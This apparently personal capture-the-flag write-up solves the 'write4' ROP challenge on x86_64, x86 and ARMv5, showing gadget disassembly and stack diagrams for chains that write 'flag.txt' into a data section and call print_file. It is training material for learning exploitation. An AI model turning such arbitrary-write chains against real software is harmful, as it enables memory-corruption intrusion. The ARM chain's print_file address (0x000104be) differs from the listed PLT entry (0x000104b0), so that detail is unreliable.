# write4

In this challenge, the objective is to achieve an arbitrary write, with the final goal being
to send the `flag.txt` string to the `print_file` function.

## x86_64:
```asm
[24] .bss              NOBITS           0000000000601038  00001038
    0000000000000008  0000000000000000  WA       0     0     1

0000000000400510 <print_file@plt>:

0000000000400628 <usefulGadgets>:
  400628:	4d 89 3e         mov    QWORD PTR [r14],r15
  40062b:	c3         ret

0000000000400690 <__libc_csu_init + 0x60>:
  400690:	41 5e            pop    r14
  400692:	41 5f            pop    r15
  400694:	c3               ret

0000000000400693 <__libc_csu_init + 0x63>:
  400693:	5f               pop    rdi
  400694:	c3               ret
```
With the provided gadgets, we have a write `r15` value at address `r14`.
The `__libc_csu_init` function gives us a pop chain that finishes by a pop of `r14` and `r15`.
I used the same trick as on the first challenge, chopping one byte off the `pop r15` to have
a `pop rdi` at disposal.   
We can also see that the bss section is 8 bytes long, perfect to store our `flag.txt` string,
and we have access to its address that will never change.
The final exploit is: pop the bss address and `flag.txt` as `r14` and `r15`, jump to the
store gadget, then pop bss address into `rdi` and finally jump to the print_file PLT entry.
```
┌─────────────────────────┐
│ 0x400690                │ <- pop r14; pop r15; ret
├─────────────────────────┤
│ 0x601038                │ <- BSS
├─────────────────────────┤
│ "flag.txt"              │ <- String literal
├─────────────────────────┤
│ 0x400628                │ <- mov QWORD PTR [r14], r15; ret
├─────────────────────────┤
│ 0x400693                │ <- pop rdi; ret
├─────────────────────────┤
│ 0x601038                │ <- BSS
├─────────────────────────┤
│ 0x400510                │ <- print_file
├─────────────────────────┤
│ ...                     │
```
## x86:
```asm
[24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4

080483d0 <print_file@plt>:

08048543 <usefulGadgets>:
 8048543:	89 2f            mov    DWORD PTR [edi],ebp
 8048545:	c3               ret

080485aa <__libc_csu_init + 0x5a>:
 80485aa:	5f               pop    edi
 80485ab:	5d               pop    ebp
 80485ac:	c3               ret  
```
In x86, words are 4 bytes long, so we'll need to do 2 arbitrary writes of 4 bytes each, to
compose the string `flag.txt`. We use the data section this time, its size being 8 bytes.
The payload is then very similar to the x86_64 one.
```             
┌─────────────┐                                    │ ...         │
│ 0x080485aa  │ <- pop edi; pop ebp; ret;          ├─────────────┤
├─────────────┤                                    │ 0x080483d0  │ <- print_file
│ 0x0804a018  │ <- DATA                            ├─────────────┤
├─────────────┤                                    │ 0x0804a018  │ <- DATA
│ "flag"      │ <- String literal                  ├─────────────┤
├─────────────┤                                    │ ...         │
│ 0x08048543  │ <- mov DWORD PTR [edi], ebp; ret
├─────────────┤
│ ...         │
```
The left block is repeated 2 times, writing `flag` then `.txt` at DATA and DATA+4 respectively.
Then we call print_file using the written string address.
## ARMv5:
```asm
[22] .data             PROGBITS        00021024 001024 000008 00  WA  0   0  4

000104b0 <print_file@plt>:

000105ec <usefulGadgets>:
   105ec:	e5843000 	str	r3, [r4]
   105f0:	e8bd8018 	pop	{r3, r4, pc}
   105f4:	e8bd8001 	pop	{r0, pc}
```
Using the 3 gadgets, we can do the same maneuver of writing `flag.txt` into the data section.
Since the store gadget falls into the triple pop, we can use those from our first write to
setup registers for the second one.
```
┌─────────────┐
│ 0x000105f0  │ <- pop {r3, r4, pc}
├─────────────┤
│ "flag"      │ <- String literal
├─────────────┤
│ 0x00021024  │ <- DATA
├─────────────┤
│ 0x000105ec  │ <- str r3, [r4]; pop {r3, r4, pc}
├─────────────┤
│ ".txt"      │ <- String literal
├─────────────┤
│ 0x00021028  │ <- DATA + 4
├─────────────┤
│ 0x000105ec  │ <- str r3, [r4]; pop {r3, r4, pc}
├─────────────┤
│ 00 00 00 00 │ <- dummy values for r3 and r4
│ 00 00 00 00 │
├─────────────┤
│ 0x000105f4  │ <- pop {r0, pc}
├─────────────┤
│ 0x00021024  │ <- DATA
├─────────────┤
│ 0x000104be  │ <- print_file
├─────────────┤
│ ...         │
```
